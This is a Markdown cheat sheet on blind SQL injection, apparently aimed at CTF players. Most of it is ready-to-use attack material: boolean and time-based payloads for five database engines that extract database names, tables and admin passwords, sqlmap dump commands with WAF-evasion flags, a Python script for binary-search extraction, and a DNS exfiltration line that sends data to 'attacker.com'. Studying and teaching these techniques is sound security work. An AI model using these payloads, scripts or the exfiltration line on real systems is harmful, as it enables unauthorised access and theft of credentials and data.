# SQL Injection — Blind SQLi

---

## Quick Reference

| Type | Indicator | Core Payload |
|------|-----------|-------------|
| Boolean-based | Page changes (content/size/status) | `' AND 1=1--` vs `' AND 1=2--` |
| Time-based | Response delay | `' AND SLEEP(5)--` |
| Boolean extract | TRUE = char matched | `' AND SUBSTRING(database(),1,1)='a'--` |
| Time extract | TRUE = delay fires | `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--` |
| Binary search | Narrow ASCII range | `' AND ASCII(SUBSTRING(database(),1,1))>100--` |
| sqlmap auto | Full dump | `sqlmap -u "URL?id=1" --batch --dump` |

```sql
-- Confirm boolean blind (responses must differ)
' AND 1=1--      ← TRUE  → normal response
' AND 1=2--      ← FALSE → different response

-- Confirm time blind (no visible difference needed)
' AND SLEEP(5)--          -- MySQL / MariaDB
'; WAITFOR DELAY '0:0:5'-- -- MSSQL
' AND pg_sleep(5)--        -- PostgreSQL
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5) IS NOT NULL-- -- Oracle
' AND 1=1-- (no native sleep in SQLite; use heavy query instead)
```

---

## What is Blind SQL Injection? 🔓

Blind SQLi occurs when the application is vulnerable but **never shows query output or errors** in the response. Instead of reading data directly, you ask the database a series of yes/no questions and infer the answer from the application's behavior.

**Impact:**
- 🔴 Full data extraction — same as UNION-based, just slower
- 🔴 Works even when output is completely hidden from the page
- 🔴 Can enumerate credentials, flags, and schemas character by character
- ⚠️ Requires patience or automation — manual extraction is tedious

**How it differs from UNION-based:**

```sql
-- UNION-based: you READ the output directly
' UNION SELECT NULL,password,NULL FROM users--   ← value appears on page

-- Blind: you ASK questions and observe behavior
' AND SUBSTRING(password,1,1)='a'--   ← no output, but page changes if TRUE
```

---

## Detecting Blind SQL Injection

No error messages visible? No UNION output? Try these to confirm injection still exists.

**Boolean detection — compare two responses:**

```sql
' AND 1=1--      ← always TRUE  → baseline response
' AND 1=2--      ← always FALSE → response should differ
```

Look for differences in: page content, response length, HTTP status code, redirect behavior, or element count.

**Time detection — no visible difference needed:**

```sql
' AND SLEEP(5)--                           -- MySQL / MariaDB
'; WAITFOR DELAY '0:0:5'--                 -- MSSQL
' AND 1=1 AND pg_sleep(5)--                -- PostgreSQL
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1-- -- Oracle
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) x JOIN (SELECT 1 UNION SELECT 2 UNION SELECT 3) y JOIN (SELECT 1 UNION SELECT 2 UNION SELECT 3) z)>0-- -- SQLite (no SLEEP; use heavy query)
```

⚠️ If `' AND 1=1--` and `' AND 1=2--` produce identical responses, try time-based before giving up on injection.

---

## Boolean-Based Extraction

Extract data one character at a time by asking TRUE/FALSE questions. Each confirmed character narrows down the value.

**Extract DB name length first (binary search approach):**

```sql
' AND LENGTH(database())>5--
' AND LENGTH(database())>8--
' AND LENGTH(database())=8--   ← exact match found
```

**Extract each character (brute-force approach):**

```sql
' AND SUBSTRING(database(),1,1)='a'--   ← pos 1
' AND SUBSTRING(database(),2,1)='d'--   ← pos 2
' AND SUBSTRING(database(),3,1)='m'--   ← pos 3
```

**Extract each character (binary search on ASCII — much faster):**

```sql
' AND ASCII(SUBSTRING(database(),1,1))>100--   ← above 'd'?
' AND ASCII(SUBSTRING(database(),1,1))>110--   ← above 'n'?
' AND ASCII(SUBSTRING(database(),1,1))>115--   ← above 's'?
' AND ASCII(SUBSTRING(database(),1,1))=117--   ← exact: 'u' ✅
```

Binary search finds each character in ~7 requests instead of up to 94. Always use it.

**Extract table names:**

```sql
-- First table name, first character
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u'--

-- SQLite equivalent
' AND (SELECT SUBSTRING(name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1)='u'--
```

**Extract column data:**

```sql
-- Does user 'admin' exist?
' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--

-- First char of admin's password
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5'--

-- ASCII binary search on password char
' AND ASCII((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin'))>50--
```

---

## Time-Based Extraction

Same logic as boolean, but TRUE fires a delay instead of changing the page. Use this when responses look identical regardless of the condition.

**MySQL / MariaDB:**

```sql
-- Confirm
' AND IF(1=1,SLEEP(5),0)--

-- Extract DB name char
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- ASCII binary search
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)--

-- Extract password
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5',SLEEP(5),0)--
```

**PostgreSQL:**

```sql
-- Confirm
' AND 1=1 AND pg_sleep(5)--

-- Extract char
' AND CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Extract password
' AND CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**MSSQL:**

```sql
-- Confirm
'; WAITFOR DELAY '0:0:5'--

-- Extract char
'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:5'--

-- Extract password
'; IF ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='5') WAITFOR DELAY '0:0:5'--
```

**Oracle:**

```sql
-- Confirm
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--

-- Extract char
' AND CASE WHEN (SUBSTR(user,1,1)='a') THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END--
```

**SQLite (no SLEEP — use heavy computation):**

```sql
-- Confirm delay via subquery bomb
' AND (SELECT COUNT(*) FROM sqlite_master m1, sqlite_master m2, sqlite_master m3)>0--

-- Conditional extraction (use with boolean if possible — time-based is unreliable in SQLite)
```

⚠️ For CTFs: time-based is slower and noisier. Always try boolean-based first.

---

## Advanced Variations

**Stacked subqueries for table enumeration (boolean):**

```sql
-- Second table name, first character
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1)='f'--
```

**CASE WHEN as universal conditional:**

```sql
-- Works across MySQL, PostgreSQL, MSSQL, Oracle, SQLite
' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--                    ← TRUE test
' AND CASE WHEN (SUBSTRING(database(),1,1)='a') THEN 1 ELSE 0 END=1--
```

**Hex encoding to avoid quote issues:**

```sql
-- Instead of 'admin', use hex
' AND SUBSTRING(username,1,5)=0x61646d696e--   -- MySQL
' AND SUBSTRING(username,1,5)=CHAR(97,100,109,105,110)--  -- universal
```

**Out-of-band (OOB) — rare in CTFs, useful when nothing else works:**

```sql
-- DNS exfil (MySQL — requires FILE privilege)
' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\x'))--

-- PostgreSQL COPY exfil
'; COPY (SELECT password FROM users) TO '/tmp/out.txt'--
```

---

## Automation with sqlmap

Manual blind SQLi extraction is ~7 requests per character. Automate it.

**Basic detection and dump:**

```bash
# Auto-detect and dump everything
sqlmap -u "http://target.com/page?id=1" --batch --dump

# POST request
sqlmap -u "http://target.com/login" --data="username=1&password=test" --batch --dump

# With cookie injection
sqlmap -u "http://target.com/page" --cookie="session=abc123; id=1" --batch --dump
```

**Technique-specific:**

```bash
# Boolean-based only
sqlmap -u "URL?id=1" --technique=B --batch

# Time-based only
sqlmap -u "URL?id=1" --technique=T --batch

# Combine boolean + time
sqlmap -u "URL?id=1" --technique=BT --batch
```

**Targeted extraction:**

```bash
# List databases
sqlmap -u "URL?id=1" --dbs --batch

# List tables in a DB
sqlmap -u "URL?id=1" -D dbname --tables --batch

# Dump specific table
sqlmap -u "URL?id=1" -D dbname -T users --dump --batch

# Dump specific columns only
sqlmap -u "URL?id=1" -D dbname -T users -C username,password --dump --batch
```

**Speed and stealth:**

```bash
# Increase threads for speed
sqlmap -u "URL?id=1" --threads=5 --batch --dump

# Add delay between requests (WAF evasion)
sqlmap -u "URL?id=1" --delay=1 --batch --dump

# Random agent to avoid detection
sqlmap -u "URL?id=1" --random-agent --batch --dump
```

---

## Per-Database Function Reference

| Function | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|----------|-------|-----------|-------|--------|--------|
| Substring | `SUBSTRING(s,p,l)` | `SUBSTRING(s FROM p FOR l)` | `SUBSTRING(s,p,l)` | `SUBSTR(s,p,l)` | `SUBSTR(s,p,l)` |
| Length | `LENGTH(s)` | `LENGTH(s)` | `LEN(s)` | `LENGTH(s)` | `LENGTH(s)` |
| ASCII | `ASCII(s)` | `ASCII(s)` | `ASCII(s)` | `ASCII(s)` | `UNICODE(s)` |
| Conditional | `IF(c,t,f)` | `CASE WHEN` | `CASE WHEN` | `CASE WHEN` | `CASE WHEN` |
| Sleep | `SLEEP(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | `DBMS_PIPE` | ❌ no native |

**Custom Python script for boolean extraction:**

```python
import requests
import string

url = "http://target.com/page?id=1"
TRUE_INDICATOR = "Welcome"  # text present only on TRUE response
chars = string.printable.strip()

def check(payload):
    r = requests.get(url + payload)
    return TRUE_INDICATOR in r.text

# Binary search per character
def extract_char(query, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check(f"' AND ASCII(({query}))>{mid}--"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo != 32 else None

# Extract DB name
result = ""
for i in range(1, 30):
    c = extract_char(f"SELECT SUBSTRING(database(),{i},1)", i)
    if not c:
        break
    result += c
    print(f"[+] {result}")

print(f"\nDatabase: {result}")
```

---

## Exploitation Workflow

1. **Confirm injection** — `'` triggers error or behavior change
2. **Determine blind type** — compare `1=1` vs `1=2` responses; if identical, switch to time-based
3. **Establish TRUE/FALSE baseline** — note exactly what changes (length, text, status)
4. **Get DB name length** — binary search with `LENGTH(database())>N`
5. **Extract DB name** — binary search ASCII per position
6. **List tables** — query `information_schema.tables` (or `sqlite_master`) char by char
7. **Pick target table** — `users`, `flag`, `admin`, `secrets`
8. **List columns** — query `information_schema.columns` for that table
9. **Extract target rows** — pull `username`, `password`, `flag` char by char
10. **Automate if stuck** — switch to sqlmap with `--technique=B` or `--technique=T`

---

## Common Vulnerable Patterns

**Boolean reflected in content:**

```python
# ❌ Vulnerable — condition leaks into template logic
query = f"SELECT * FROM products WHERE id = {user_id}"
if results:
    return render("found.html")   # TRUE response
else:
    return render("notfound.html")  # FALSE response — attacker reads this difference
```

**Boolean reflected in redirect:**

```php
// ❌ Vulnerable — auth check leaks TRUE/FALSE via redirect
$r = $db->query("SELECT * FROM users WHERE token='$token'");
if ($r->rowCount() > 0) { header("Location: /dashboard"); }
else { header("Location: /login?err=1"); }
```

**Time leakage via unparameterized sleep-capable query:**

```javascript
// ❌ Vulnerable — attacker injects SLEEP into sort field
const q = `SELECT * FROM items ORDER BY ${req.query.sort}`;
// Payload: price,SLEEP(5)
```

**Output suppressed but injectable:**

```python
# ❌ Vulnerable — result is discarded but query still runs
db.execute(f"INSERT INTO logs (page) VALUES ('{page}')")
# No output returned, but boolean/time still works
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```sql
' AND 1=1--            -- TRUE baseline
' AND 1=2--            -- FALSE baseline (response MUST differ)
' AND SLEEP(5)--       -- time confirm if boolean unclear
```

**Speed tips:**
- ✅ Always use **binary search on ASCII** — finds each char in ~7 requests vs up to 94
- ✅ Confirm TRUE/FALSE baseline carefully — a flaky indicator breaks your whole script
- ✅ Automate with sqlmap or a Python script after manual confirmation
- ✅ In CTFs, try `flag`, `secret`, `key` as table/column names before enumerating
- ⚠️ Time-based is unreliable under network jitter — use 5s+ delays and repeat to confirm
- ⚠️ SQLite has no `SLEEP()` — use boolean-based exclusively or a heavy subquery trick

**Common CTF scenarios:**
- **No output, page changes** → boolean-based, write a script fast
- **No output, identical pages** → time-based, confirm with 5s SLEEP
- **Login with no feedback** → time-based in username/password field
- **API returning only `true`/`false`** → perfect boolean target, automate immediately
- **WAF blocking SLEEP** → try `BENCHMARK(5000000,MD5(1))` (MySQL) or `pg_sleep` alternatives

---

## Key Takeaways

- ✅ Blind SQLi gives no output — you extract data by asking yes/no questions
- ✅ Always establish a reliable TRUE/FALSE baseline before extracting anything
- ✅ Binary search on ASCII values finds each character in ~7 requests — never brute-force
- ✅ Time-based works when boolean responses are identical, but is slower and less reliable
- ✅ Automate early — manual character-by-character extraction of a 32-char hash takes 224+ requests
- ✅ SQLite has no `SLEEP()` — stick to boolean-based or heavy subquery delays